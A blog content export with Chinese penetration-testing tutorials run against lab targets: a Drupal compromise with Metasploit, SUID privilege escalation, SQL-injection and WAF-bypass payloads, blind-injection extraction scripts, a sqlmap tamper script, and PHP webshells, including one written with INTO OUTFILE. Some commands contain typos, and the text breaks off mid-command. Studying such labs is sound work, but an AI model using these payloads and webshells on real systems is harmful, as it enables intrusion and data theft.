{"meta":{"title":"baiQstar的博客","subtitle":"","description":"","author":"白易安","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"三十一，通过IP获得服务器权限","slug":"三十一，通过IP获得服务器权限","date":"2024-01-01T08:28:46.000Z","updated":"2024-01-01T10:18:10.683Z","comments":true,"path":"2024/01/01/三十一，通过IP获得服务器权限/","permalink":"http://example.com/2024/01/01/%E4%B8%89%E5%8D%81%E4%B8%80%EF%BC%8C%E9%80%9A%E8%BF%87IP%E8%8E%B7%E5%BE%97%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90/","excerpt":"","text":"1，获得IP地址靶机与Kali在同一VMware中，可先查看靶机的MAC地址，可点击设置—&gt;网络适配器—&gt;高级，找到MAC地址为:00:0C:29:60:07:93 先查看当前Kali的IP为：192.168.2.100 在Kali中ping 该网段中的所有存在的地址，并对比MAC地址，找到靶机的IP为：192.168.2.119 1nmap -sn 192.168.2.100/24 2，扫描靶机的IP有哪些开放的端口1map -p1-500 -v 192.168.2.119 通过上图可以看到，靶机开放了22，80，111三个端口，其中80端口时http服务端口，用浏览器打开看看 尝试用admin-admin&#x2F;admin123等弱密码登录，无法成功 3，目录扫描，寻找有关漏洞信息的文件1dirsearch -u &quot;http://192.168.2.119&quot; -x 403,404 将以上文件在浏览器中打开看看 在http://192.168.2.119/UPGRADE.txt中发现 发现该网站是用Drupal技术搭建的，且版本为7.10之前 去官网查看版本，发现这是2015年的版本了，说明其可能存在漏洞 4，用msfconsole获得shell12msfconsole 打开msfconsole search drupal 查看drupal有哪些漏洞 在以上漏洞中，我们选择2016年及其之后的使用 1shell 5,权限维持在Kali中创建1.php 123&lt;?php@eval($_GET[&quot;a&quot;]);?&gt; kala进入桌面的文件夹下后开启简易的web服务 1python -m thhp.server 8081 在拿到的shell中下载该1.php文件 6,提升权限123python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -name cron.php -exec &quot;/bin/sh&quot; \\; 7，结果","categories":[],"tags":[]},{"title":"三十，SQL注入绕过","slug":"三十，SQL注入绕过","date":"2023-12-28T11:41:08.000Z","updated":"2023-12-28T13:56:26.045Z","comments":true,"path":"2023/12/28/三十，SQL注入绕过/","permalink":"http://example.com/2023/12/28/%E4%B8%89%E5%8D%81%EF%BC%8CSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/","excerpt":"","text":"目录： &emsp;&emsp;1，绕过空格 (注释符&#x2F;* *&#x2F;，%a0) &emsp;&emsp;2，引号绕过(使用十六进制) &emsp;&emsp;3，逗号绕过(使用from或者offset) &emsp;&emsp;4，or and xor not绕过 &emsp;&emsp;5，绕过注释符号 (#，–(后面跟一个空格) ) 过滤 &emsp;&emsp;6，绕过union，select，where等 &emsp;&emsp;7，宽字节注入 &emsp;&emsp;8，多参数请求拆分 &emsp;&emsp;9，HTTP参数污染 &emsp;&emsp;10，编写使用tamper &emsp;&emsp;11，堆叠注入 &emsp;&emsp;12，绕过waf 在做sqli关卡时，会遇到各种各样的限制，如禁止使用and,or,#注释等等，对此若想继续进行SQL注入，则需使用以下方法来绕过这些限制。 1，绕过空格（注释符&#x2F;* *&#x2F;，%a0）两个空格代替一个空格，用Tab代替空格，%a0&#x3D;空格： 1%20 %09 %0a %0b %0c %0d %a0 %00 /**/ /*!*/ （） 最基本的绕过方法，用注释替换空格： 1234/* 注释 *//**/表示注释/*!*/表示在!后还能加入sql语句并执行，只能执行sql版本号支持的sql语句 例如27a关禁用空格，用%0a来代替，布尔盲注代码如下： 1paramsGet = url+ &#x27;%0aand%0aascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%0a and&quot;1&quot;=&quot;1&#x27;.format(i,tmp) 26a用（）来代替空格，布尔盲注代码如下： 1paramsGet = url+ &quot;anandd(ascii(substr((select (group_concat(table_name) ) from (infoorrmation_schema.tables) where (table_schema=database())),&#123;0&#125;,1))&gt;&#123;1&#125;)anandd&#x27;1&#x27;=&#x27;1&quot;.format(i,tmp) 2，引号绕过（使用十六进制）若禁用了双引号“，但我们在以下查询指定表的字段时需要用的双引号 1select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot; and table_schema=database(); 遇到这样的问题就要使用十六进制来处理这个问题了。users的十六进制的字符串是7573657273。那么最后的sql语句就变为了： 1select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 and table_schema=database(); 3，逗号绕过（使用from或者offset）在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决： 12select substr(database() from 1 for 1);select mid(database() from 1 for 1); 使用join： 12union select 1,2 #等价于union select * from (select 1)a join (select 2)b 使用like： 12select ascii(mid(user(),1,1))=80 #等价于select user() like &#x27;r%&#x27; 对于limit可以使用offset来绕过： 12select * from news limit 0,1 #等价于select * from news limit 1 offset 0 4，or and xor not绕过123and=&amp;&amp; or=|| xor=| not=!如果是有以上字符则删除再执行，则使用双写或部分大写部分小写绕过and=anandd or=oorr 5,绕过注释符号（#，–(后面跟一个空格））过滤以单引号‘闭合为例 12id=1&#x27; union select 1,2,3||&#x27;1and&#x27;1&#x27;=&#x27;1 6，绕过union，select，where等（1）使用注释符绕过 常用注释符： 1//，-- , /**/, #, --+, -- -, ;,%00,--a 用法： 1U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user （2）使用大小写绕过 1id=-1&#x27;UnIoN/**/SeLeCT （3）内联注释绕过 1id=-1&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()# （4） 双关键字绕过（若删除掉第一个匹配的union就能绕过） 1id=-1&#x27;UNIunionONSeLselectECT1,2,3–- 7，.宽字节注入过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为 ‘ 。在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般用%df 吃掉 \\ ，具体的方法是 urlencode(‘) &#x3D; %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面： 1id=-1%df%27union select 1,user(),3--+ 8，多参数请求拆分对于多个参数拼接到同一条SQL语句中的情况，可以将注入语句分割插入。 例如请求URL时，GET参数格式如下： 1a=[input1]&amp;b=[input2] 将GET的参数a和参数b拼接到SQL语句中，SQL语句如下所示。 1and a=[input1] and b=[input2] 这时就可以将注入语句进行拆分，如下所示： 1a=union/*&amp;b=*/select 1,2,3,4 最终将参数a和参数b拼接，得到的SQL语句如下所示： 1and a=union /*and b=*/select 1,2,3,4 9，HTTP参数污染HTTP参数污染是指当同一个参数出现多次，不同的中间件会解析为不同的结果。具体如下图所示：（以参数color&#x3D;red&amp;color&#x3D;blue为例）。 例如29关，就只拿到最后以为参数 1http://192.168.2.55:808/sqli/Less-29/?id=1&amp;id=-1&#x27; union select 1,database(),3 and &#x27;1&#x27;=&#x27;1 10，编写使用tamper在做26a关时禁用了and,or,空格和注释，所有直接使用SQLmap是爆不出数据库的，所以就要使用tamper 123456789101112131415from lib.core.enums import PRIORITY__priority__ = PRIORITY.NORMALdef dependencies(): passdef tamper(payload, **kwargs): payload = payload.lower() payload = payload.replace(&#x27;and&#x27;, &#x27;anandd&#x27;) payload = payload.replace(&#x27;or&#x27;, &#x27;oorr&#x27;) payload = payload.replace(&#x27; &#x27;, &#x27;%0B&#x27;) payload = payload.replace(&quot;#&quot;, &quot;anandd&#x27;1&#x27;=&#x27;1&quot;) return payload 以上是自己编写的tamper名为sx.py作用是将SQLmap爆库时的语句中被禁用的字符替换为可用的 将sx.py放入Kali的&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;tamper&#x2F;目录下 使用命令 1sqlmap -u &quot;http://192.168.2.99:808/sqli/Less-26a/?id=1&quot; --batch -v 3 -- tamper=sx --dbs --level=5 --risk=3 11，堆叠注入存在条件： 1，目标存在sql注入漏洞 2，目标未对”;”号进行过滤 3，目标中间层查询数据库信息时可同时执行多条sql语句，例如php中mysqli_multi_query()函数 在38关，传入单引号报错,发现错误回显分析后构造单引号闭合发现字符型注入 经过测试存在union联合注入,使用联合注入爆破出users表中有id、username、password三个 字段.于是尝试堆叠注入将id为1的用户密码改成123,可以配合联合查询来判断sql是否执行。 1http://127.0.0.1/sqli-labs-master/Less-38/?id=-1%27%20union%20select%201,2,3;update%20users%20set%20password=123%20where%20id=1--+ 再次查询 已经更改，我们打开php源代码看一下，可以看到有mysqli_multi_query()函数 12345678910111213141516171819if (mysqli_multi_query($con1, $sql))&#123; /* store first result set */ if ($result = mysqli_store_result($con1)) &#123; if($row = mysqli_fetch_row($result)) &#123; echo &#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;; printf(&quot;Your Username is : %s&quot;, $row[1]); echo &quot;&lt;br&gt;&quot;; printf(&quot;Your Password is : %s&quot;, $row[2]); echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; &#125;// mysqli_free_result($result); &#125; 12，绕过waf 说明waf已开启 使用yakit判断该waf拦截哪些字符，插入字典，进行执行 观察响应的数据包大小，发现order by 和union select两组被waf拦截 123用/*//*/来代替空格用/*！版本号*/来包裹关键字在mysq中 /*!*/ 不是注释，mysql为了保持兼容，它把一些特有的仅在mysql上用的语句放在 /*!*/ 中，这样这些语句如果在其他数据库中是不会被执行，但在mysal中它会执行。如下语/*!50001 select from test*/这里的50001表示假如 数据库是5.00.01及以上版本，该语句才会被执行。 我们用yakit来测试可用的版本号 最后拼合语句 1http://192.168.2.99:8081/sqli/Less-1/?id=0&#x27;/*//*/union/*//*//*!00044select*/1,2,3-- - 查数据库，语句为 1http://192.168.2.99:8081/sqli/Less-1/?id=0&#x27;/*//*/union/*//*//*!00044select*/1,/*!00044database*//*//*//*!00044()*/,3-- -","categories":[],"tags":[]},{"title":"二十九，SQL注入","slug":"二十九，SQL注入","date":"2023-12-21T11:08:56.000Z","updated":"2023-12-28T11:35:46.727Z","comments":true,"path":"2023/12/21/二十九，SQL注入/","permalink":"http://example.com/2023/12/21/%E4%BA%8C%E5%8D%81%E4%B9%9D%EF%BC%8CSQL%E6%B3%A8%E5%85%A5/","excerpt":"","text":"目录： &emsp;&emsp; SQL注入的危害:&emsp;&emsp; MySQL数据库5.0上下的区别:&emsp;&emsp; SQL注入的步骤，以sqli练习网站为例:&emsp;&emsp;&emsp;&emsp;1，使用‘，”，),or 1&#x3D;1&#x2F;1&#x3D;2等来判断是否能进行注入以及闭合&emsp;&emsp;&emsp;&emsp;2，使用order by 来判断返回列数&emsp;&emsp;&emsp;&emsp;3，运用union联合查询来判断回显数据的位置&emsp;&emsp;&emsp;&emsp;4，获取数据库版本和当前查询的数据库的名称&emsp;&emsp;&emsp;&emsp;5，根据以上获取的信息，拿到当前数据库下的所有表的名称 &emsp;&emsp;&emsp;&emsp;6，查询某一张表中的列名，以users表为例&emsp;&emsp;&emsp;&emsp;7，获取某一张表的所有数据&emsp;&emsp;报错注入用Postman进行注入基于布尔的盲注&emsp;&emsp;&emsp;&emsp;1，判断数据库类型&emsp;&emsp;&emsp;&emsp;2，判断当前数据库名&emsp;&emsp;&emsp;&emsp;3，判断当前库的表名&emsp;&emsp;&emsp;&emsp;4，判断表的字段&emsp;&emsp;&emsp;&emsp;5，爆字段中的数据&emsp;&emsp;&emsp;&emsp;6,修改后的python代码&emsp;&emsp;基于时间的盲注&emsp;&emsp;二次注入&emsp;&emsp;基于SQL注入拿到webshell&emsp;&emsp;sQLmap &emsp;&emsp;SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。 SQL注入的危害： 数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。 网页篡改：通过操作数据库对特定网页进行篡改。 网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。 数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。 服务器被远程控制，被安装后门：经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。 破坏硬盘数据，瘫痪全系统。 MySQL数据库5.0上下的区别：​ mysql5.0以及5.0以上的版本都存在一个系统自带的系统数据库，是information_schema,而5.0之前的版本不存在且5.0以下的版本是多用户单操作。information_schema数据库中含有三张表（schemata、tables、columns）。这三张表中存放的字段依次为（schema_name）、（table_name,table_schema）、（table_schema,table_name,column_name） ​ 因此在我们进行sql注入时，当得知mysql的版本是5.0以上的就比较简单了，可以对information_schema数据库进行爆破，来获取想要知道的表、表中的数据等一些重要信息。相比较与5.0以下的版本对其进行注入的时相对来说比较麻烦，需要对数据库进行暴力破解的方式，来爆破其中的敏感数据库，表等信息。 SQL注入的步骤，以sqli练习网站为例：以下示例为get请求方式，post请求同理 1，使用 ‘，*)*,or 1&#x3D;1&#x2F;1&#x3D;2等来判断是否能进行注入以及闭合 在上图中根据输入的id&#x3D;1正常，id&#x3D;1’报错和SQL回显的报错语句可判断是这是一个字符型注入 1http://192.168.2.59/sqli/Less-1/?id=1’ -- - 在1‘后加入– -表示将后面的内容都注释掉，运行后正常表示判断正确 2，使用order by 来判断返回列数order by是根据第n列来进行排序，设定不存在的列则会报错 1http://192.168.2.59/sqli/Less-1/?id=1’ order by 4 -- - 根据上图order by 4正常显示,order by 5报错，判断出返回的是4列数据 3，运用union联合查询来判断回显数据的位置1http://192.168.2.59/sqli/Less-1/?id=0’ union select 1,2,3,4 -- - 根据select 1，2，3，4判断出页面上会显示出第2，3列的数据，之后将查询语句和数据放在这两个位置上 4，获取数据库版本和当前查询的数据库的名称1http://192.168.2.59/sqli/Less-1/?id=1’ union select 1,batase(),version()，4 -- - 根据SQL自带的函数database（），version（）可以很容易的拿到当前数据库名和版本信息 看到版本为5.7.26大于5，则之后可以用自带的系统数据库information_schema来查询我们想要的信息 以下是常用的SQL函数 5，根据以上获取的信息，拿到当前数据库下的所有表的名称1http://192.168.2.59/sqli/Less-1/?id=0&#x27; union select 1,group_concat(table_name) ,3,4 from information_schema.tables where table_schema=&#x27;security&#x27;; -- - 其中union是联合查询，group_concat(table_name)会将其中查到的内容用逗号分隔，information_schema.tables是MySQL5.0以上系统自带的数据库中存放所有表名称的表， where table_schema&#x3D;’security’指定表所在的数据库为security，是上一步所查询出的数据库名称 根据上图可以看出security数据库中有comments,emails,referers,uagents,users五张表 6，查询某一张表中的列名，以users表为例1http://192.168.2.59/sqli/Less-1/?id=0&#x27; union select 1,group_concat(column_name) ,3 ,4 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;; -- - 根据查询结果可以看出users表有id,username,password,isadm四个字段 7，获取某一张表的所有数据1http://192.168.2.59/sqli/Less-1/?id= -1&#x27;union select 1,group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password,&quot;~&quot;,isadm),3 ,4 from users;-- - 报错注入​ 报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用，首选报错注入。报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。 以下是构造好的常用语句，在参数后加and，再将以下语句加入修改参数就可以使用 123456789101112131415161718192021(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)(extractvalue(1,concat(0x7e,(select user()),0x7e)))(updatexml(1,concat(0x7e,(select user()),0x7e),1))exp(~(select * from(select user())a))exp:5.5-5.6geometrycollection((select * from(select * from(select user())a)b))multipoint((select * from(select * from(select user())a)b))polygon((select * from(select * from(select user())a)b))multipolygon((select * from(select * from(select user())a)b))linestring((select * from(select * from(select user())a)b))multilinestring((select * from(select * from(select user())a)b)) 1http://192.168.2.59/sqli/Less-5/?id=1&#x27; and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- - 这样就可以看到当前用户了，也可以修改参数，查看当前数据库名称 1http://192.168.2.59/sqli/Less-5/?id=1&#x27; and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- - 用Postman进行注入有些页面不能展现所有的返回数据，并且在浏览器的地址栏也不能进行post请求，所以可以使用软件postman来进行这些操作，方便好用。 在浏览器打开开发者工具，找到网络，清空后点击页面请求api的按钮，看到响应是json数据的一般就是api接口了 基于布尔的盲注​ 布尔盲注，即在页面没有错误回显时完成的注入攻击。此时我们输入的语句让页面呈现出两种状态，相当于true和false，根据这两种状态可以判断我们输入的语句是否查询成功。以less-8关为例 我们输入正确的id，显示You are in ….. 我们输入错误的语句如id&#x3D;1’ ，或者id&#x3D;-1时，就什么都不显示。这就是布尔盲注，屏幕上能得到信息不多，就是两种状态 构造判断语句，根据页面是否回显证实猜想。一般用到的函数ascii() 、substr() 、length()，exists()、concat()等。 用python脚本来判断当前的数据库名称 1234567891011121314# id=1&#x27;and ascii(substring(database(),1,1))=115--+import requeststr=&#x27;You are in&#x27;name=&#x27;&#x27;url1=&quot;http://192.168.2.70/sqli/Less-8/?id=1&quot;for j in range(1,10): for i in range(65,123): url=url1+&quot; &#x27; and ascii(substring(database(),&quot;+str(j)+&quot;,1))= &quot;+str(i)+&quot;-- -&quot; response= requests.get(url) con=response.text if tr in con: name=name+chr(i) print(name) 将上述代码修改为二分法的写法，执行速度会更快 123456789101112131415161718192021222324import requestssession = requests.session()url = &quot;http://192.168.2.59/sqli/Less-8/?id=1&#x27;&quot;def db(): name = &#x27;&#x27; for i in range(1,50): begin =32 end =128 tmp = (begin+end)//2 while begin &lt; end : paramsGet = url+ &quot;/**/and/**/ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;.format(i,tmp) response = session.get(paramsGet) if &#x27;You are in...........&#x27; in response.text: begin = tmp + 1 tmp = (begin+end)//2 else: end = tmp tmp = (begin+end)//2 if(tmp==32): break name += chr(tmp) print(name)db() 以下是盲注的一些常用语法： 1，判断数据库类型MySQL数据库表 information_schema.tables access msysobjects SQLServer sysobjects 用下的语句判断数据库。哪个页面正常显示，就属于哪个数据库 123456//判断是否是 Mysql数据库http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from information_schema.tables) --+//判断是否是 access数据库http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from msysobjects) --+//判断是否是 Sqlserver数据库http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from sysobjects) --+ 2，判断当前数据库名12345678910111213141516171：判断当前数据库的长度，利用二分法http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;5 --+ //正常显示http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;10 --+ //不显示任何数据http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;7 --+ //正常显示http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;8 --+ //不显示任何数据 大于7正常显示，大于8不显示，说明大于7而不大于8，所以可知当前数据库长度为8个字符 2：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断//判断数据库的第一个字符http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(database(),1,1))&gt;115 --+ //100为ascii表中的十进制，对应字母s//判断数据库的第二个字符http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(database(),2,1))&gt;100 --+//判断数据库的第三个字符http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(database(),3,1))&gt;100 --+...........由此可以判断出当前数据库为 security 3，判断当前库的表名12345678910111213141516171819//猜测当前数据库中是否存在admin表http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from admin) --+1：判断当前数据库中表的个数// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4http://127.0.0.1/sqli/Less-5/?id=1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;3 --+ 2：判断每个表的长度//判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;6 --+//判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=6 --+ 3：判断每个表的每个字符的ascii值//判断第一个表的第一个字符的ascii值http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 --+//判断第一个表的第二个字符的ascii值 http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;100 --+.........由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断 4， 判断表的字段123456789101112131415161718192021//如果已经证实了存在admin表，那么猜测是否存在username字段http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select username from admin) 1：判断表中字段的个数//判断users表中字段个数是否大于5http://127.0.0.1/sqli/Less-5/?id=1&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;)&gt;5 --+ 2：判断每个字段的长度//判断第一个字段的长度http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1))&gt;5 --+//判断第二个字段的长度 http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1))&gt;5 --+ 3：判断每个字段名字的ascii值//判断第一个字段的第一个字符的asciihttp://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;100 --+//判断第一个字段的第二个字符的asciihttp://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),2,1))&gt;100 --+........... 由此可判断出users表中存在 id、username、password 字段 5，爆字段中的数据1234567891011121314我们知道了users中有三个字段 id 、username 、password，我们现在爆出每个字段的数据 1: 判断数据的长度// 判断id字段的第一个数据的长度http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select id from users limit 0,1))&gt;5 --+// 判断id字段的第二个数据的长度http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select id from users limit 1,1))&gt;5 --+ 2：判断数据的ascii值// 判断id字段的第一行数据的第一个字符的ascii值http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select id from users limit 0,1),1,1))&gt;100 --+// 判断id字段的第二行数据的第二个字符的ascii值http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select id from users limit 0,1),2,1))&gt;100 --+........... 6,修改后的python代码根据以上可以将之前的python代码修改为： 123456789101112131415161718192021222324252627282930313233343536373839404142import requestsimport syssession = requests.session()url = &quot;http://192.168.2.59:808/sqli/Less-7/?id=1&#x27;))&quot;resu=&#x27;Use outfile&#x27;name = &#x27;&#x27; def zhix(num): name = &#x27;&#x27; for i in range(1,200): begin =32 end =128 tmp = (begin+end)//2 while begin &lt; end : if(num==1): paramsGet = url+ &quot;/**/and/**/ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;.format(i,tmp) elif(num==2): paramsGet = url+ &quot;/**/and/**/ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;.format(i,tmp) elif(num==3): paramsGet = url+ &quot;/**/and/**/ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;.format(i,tmp) elif(num==4): paramsGet = url+ &quot;/**/and/**/ascii(substr((select group_concat(id,username,password) from users),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;.format(i,tmp) else: print(&#x27;输入错误！&#x27;) sys.exit() response = session.get(paramsGet) if resu in response.text: begin = tmp + 1 tmp = (begin+end)//2 else: end = tmp tmp = (begin+end)//2 if(tmp==32): break name += chr(tmp) print(name)if __name__==&#x27;__main__&#x27;: num=4 zhix(num) 修改num的值为1，2，3，4来破解数据库，表，字段和数据！ 基于时间的盲注​ 也叫延时注入。通过观察页面，既没有回显数据库内容，又没有报错信息也没有布尔类型状态，那么我们可以考虑用绝招：延时注入。延时注入就是将页面的时间线作为判断依据，一点一点注入出数据库的信息。我们以第9关为例，在id&#x3D;1后面加单引号或者双引号，页面不会发生任何改变，所以我们考虑绝招延时注入。 1?id=1&#x27; and sleep(5) --+ 如图所示，观察请求的时间线，大概在5秒以上，说明构造的sleep(5) 语句起作用，可以把这个时间线作为sql 注入的判断依据。 想要获取数据库名字，延时注入与布尔盲注类似，构造方法如下，提交参数 12?id=1&#x27; and if(ascii(substr(database(),1,1))= 115,sleep(5),0) --+if(expr1,expr2,expr3) 如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值。 代码的含义就是如果数据库名字的第一个字符的acsii值为115，则进行延时，否则返回0即什么都不返回。 基于以上我们可以编写python脚本： 1234567891011121314151617# ?id=1&#x27; and if(ascii(substr(database(),1,1))= 115,sleep(5),0) --+import requestsimport timetr=&#x27;username&#x27;name=&#x27;&#x27;url1=&quot;http://192.168.2.70/sqli/Less-9/?id=1&#x27;&quot;for j in range(1,10): for i in range(65,123): url=url1+&quot;and if( ascii(substring(database(),&quot;+str(j)+&quot;,1))= &quot;+str(i)+&quot;,sleep(3),1)-- -&quot; start_time = time.time() response = requests.get(url) end_time = time.time() elapsed_time = end_time - start_time if elapsed_time &gt; 3: # 如果响应时间超过5秒 name=name+chr(i) print(name) 运行效果如下： 此后与盲注的步骤类似！ 若睡眠sleep（）函数被禁用可以用BENCHMARK来替换，示例如下： 1http://192.168.2.70/sqli/Less-9/?id=1&#x27; and If(ascii(substr(database(),1,1))=114,1,BENCHMARK(5000000, SHA1(&#x27;Hello World&#x27;)))-- - 二次注入​ 二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到 SQL 查询语句所导致的注入。防御者可能在用户输入恶意数据时，对其中的特殊字符进行了转义处理；但在恶意数据插入到数据库时，被处理的数据又被还原并存储在数据库中，当 Web 程序调用存储在数据库中的恶意数据并执行 SQL 查询时，就发生了 SQL 二次注入。 （1）查看初始 users 表，发现初始 users 表中账号 admin 的密码为 admin （2）注册用户，在网站注册名为 admin’– - 密码为 123456 的用户 （3）修改用户密码，我们先查看一下此时的 users 表，发现多了一个用户 admin’– -， 修改用户 admin’– - 的密码 再一次查看 users 表，发现用户 admin‘– - 的密码并没有被修改，而是用户 admin 的密码被修改了。于是我们就有了 admin 的账户密码。 原因：在网站设计时，虽然过滤了注册的信息，把特殊字符进行了转义，但是在从数据库调用从外部保存下来的数据时，并没有进行过滤，使得“admin’– -”被代入到 sql 语句执行，执行了这段 payload，达到了修改用户 admin 的密码的目的 12345678910#原语句UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; #插入 payload 后的语句UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;-- -&#x27; and password=&#x27;$curr_pass&#x27; #此时 &#x27;admin&#x27; 后的语句被注释 #真正的生效的语句UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;#从而达到了修改用户 admin 密码的目的 基于SQL注入拿到webshell1，MySQL数据库的配置文件My.ini中的secure_file_priv为空 ，如下， 意思就是不限制数据的导入和导出操作，即能够上传木马文件 2，利用SQL注入获取MySQL的地址并且检查secure_file_priv是否为空 1http://192.168.2.59:808/sqli/Less-1/?id=-1&#x27; union select 1,@@datadir,@@secure_file_priv -- - 利用@@datadir和@@secure_file_priv两个函数获取MySQL的绝对路径，password后面没有东西说明secure_file_priv为空 3，在网站的根目录下写入文件 1http://192.168.2.59:808/sqli/Less-1/?id=-1&#x27; union select 1,@@datadir,&quot;&lt;?php phpindo(); ?&gt;&quot; into outfile &quot;C:\\\\phpStudy_64\\\\sqli\\\\WWW\\\\php1.php&quot; -- - 网站根目录下出现文件说明写入文件成功！ 4，注入一句话木马，拿到webs hell 1http://192.168.2.59:808/sqli/Less-1/?id=-1&#x27; union select 1,@@datadir,&quot;&lt;?php @system($_GET[a]); ?&gt;&quot; into outfile &quot;C:\\\\phpStudy_64\\\\sqli\\\\WWW\\\\php2.php&quot; -- - 其中@system($_GET[a]);是指以管理员身份运行拿到的a参数中的指令，C:\\phpStudy_64\\sqli\\WWW\\php2.php是文件的绝对路径 打开http://192.168.2.59:808/php2.php有页面说明注入成功！ 5，执行指令，例如查看系统信息 SQLmapSQLmap是一款自动化SQL注入工具，kali自带，如果想要在Windows中使用则需要安装，解压即用，下载地址为： 1https://github.com/sqlmapproject/sqlmap/archive/refs/tags/1.7.zip 使用SQLmap需要提前安装好python环境 SQLmap常用指令： 进入SQLmap的解压目录用cmd打开后，查看帮助文档 1python sqlmap.py -h 以sqli第一关为例，查看有哪些数据库 1python sqlmap.py -u &quot;http://192.168.2.59:808/sqli/Less-1/?id=1&quot; --batch --dbs 查看security数据库下有那些表 1python sqlmap.py -u &quot;http://192.168.2.59:808/sqli/Less-1/?id=1&quot; --batch -D security --tables 查看security数据库下，users表下有那些字段 1python sqlmap.py -u &quot;http://192.168.2.59:808/sqli/Less-1/?id=1&quot; --batch -D security -T users --columns 查看security数据库下，users表下的id，username两个字段有那些数据 1python sqlmap.py -u 